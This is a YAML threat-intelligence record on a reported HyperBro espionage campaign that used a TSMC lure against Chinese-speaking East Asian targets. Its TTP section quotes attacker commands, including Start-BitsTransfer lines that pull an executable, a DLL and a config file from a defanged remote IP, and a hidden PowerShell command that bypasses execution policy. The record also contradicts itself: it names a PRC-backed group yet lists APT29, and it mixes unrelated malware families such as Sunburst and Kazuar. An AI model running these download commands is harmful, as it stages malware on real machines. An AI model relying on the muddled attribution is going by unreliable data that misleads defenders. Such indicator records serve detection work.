description: EclecticIQ analysts identified a cyber espionage campaign using HyperBro
  loader variant with a Taiwan Semiconductor Manufacturing (TSMC) lure, targeting
  Mandarin/Chinese speaking East Asian regions. The campaign overlaps with previously
  reported activities attributed to PRC-backed cyber espionage groups.
attribution:
- threat_actor: PRC-backed nation-state group
- country: People's Republic of China
- APT29
malware_families:
- HyperBro
- Cobalt Strike
- ChargeWeapon
- Sunburst
- Kazuar
TTPs:
  processes:
  - vfhost.exe
  - mcods.exe
  - svchost.exe
  - powershell.exe
  - regsvr32.exe
  commandline:
  - vfhost.exe
  - mcods.exe
  - C:\Windows\System32\svchost.exe -k netsvcs
  - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass
    -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "$a='Get-Process';
    $b=Invoke-Expression; & $b $a"
  powershell:
  - Start-BitsTransfer http://154[.]93[.]7[.]99:8090/CDGServer3/images/zh/bin.config
    C:\\ProgramData\\bin.config
  - Start-BitsTransfer http://154[.]93[.]7[.]99:8090/CDGServer3/images/zh/mcods.exe
    C:\\ProgramData\\mcods.exe
  - Start-BitsTransfer http://154[.]93[.]7[.]99:8090/CDGServer3/images/zh/mcvsocfg.dll
    C:\\ProgramData\\mcvsocfg.dll
  - $a='Get-Process'; $b=Invoke-Expression; & $b $a
  scripting_engine:
